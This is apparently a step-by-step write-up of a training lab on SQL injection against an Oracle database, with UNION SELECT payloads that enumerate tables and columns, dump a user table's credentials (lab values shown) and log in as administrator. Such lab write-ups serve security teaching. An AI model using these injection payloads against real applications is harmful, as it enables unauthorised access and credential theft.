# Lab: SQL injection attack, listing the database contents on Oracle

This lab demonstrates a SQL injection attack on an Oracle-based database to retrieve and enumerate database contents and eventually login as an administrator.

---

## 🧪 Lab Objective

> The application contains a SQL injection vulnerability in the product category filter. You must:
- Determine the number of columns.
- Find the table storing usernames and passwords.
- Identify the column names.
- Dump credentials.
- Log in as `administrator`.

---

## 🛠️ Steps to Solve

### 1️⃣ Access the Lab  
➡️ Open the lab in browser and intercept the first category request.  
📸 `1-access-lab.png`

---

### 2️⃣ Open Any Category  
➡️ Click on the **Gifts** category to trigger a vulnerable GET request.  
📸 `2-click-category.png`

---

### 3️⃣ Determine Number of Columns  
➡️ Send to Repeater:  
```
'+UNION+SELECT+'abc','def'+FROM+dual--
```  
This confirms the query accepts **two columns**, both `text`.  
📸 `3-column-test.png`

---

### 4️⃣ List All Tables  
➡️ Modify request as:  
```
'+UNION+SELECT+table_name,NULL+FROM+all_tables--
```  
Look for a table resembling user data.  
📸 `4-list-tables.png`  
We find:  
```
APP_USERS_AND_ROLES  
USERS_WENIEM ✅  
```

---

### 5️⃣ List All Columns  
➡️ Target: `USERS_WENIEM`  
```
'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_WENIEM'--
```  
📸 `5-list-tables.png`

---

### 6️⃣ Identify Username and Password Columns  
➡️ Found:
```
USERNAME_RLWBCW  
PASSWORD_UWGRAH
```  
📸 `6-list-columns.png`

---

### 7️⃣ Fetch Credentials  
➡️ Payload:  
```
'+UNION+SELECT+USERNAME_RLWBCW,+PASSWORD_UWGRAH+FROM+USERS_WENIEM--
```  
📸 `7-send-credentials-request.png`

---

### 8️⃣ View Usernames and Passwords  
Check browser or response:  
```
administrator : t4llylzb9mk1w3s0bdxy  
carlos       : gx8j89rvjj8xpl49ysbi  
wiener       : w26hixogrmm6fxj5pvcu  
```  
📸 `8-fetch-credentials.png`

---

### 9️⃣ Log in as Administrator  
➡️ Use the credentials on login form.  
📸 `9-lab-solved.png`

---

## 🧾 Summary

This lab showcased:
- Oracle-specific syntax using `FROM dual`
- Use of `all_tables` and `all_tab_columns` views
- Dumping credentials via **UNION SELECT**

✅ **Lab Solved Successfully**